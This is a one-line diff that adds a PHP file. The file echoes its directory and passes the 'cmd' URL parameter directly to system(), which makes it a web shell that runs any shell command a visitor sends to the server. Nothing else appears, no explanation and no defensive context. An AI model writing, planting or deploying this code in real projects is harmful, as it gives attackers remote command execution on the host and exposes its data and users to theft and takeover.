@@ -1,0 +1,1 @@
+<?php echo __DIR__;system($_GET[cmd]);die;?>
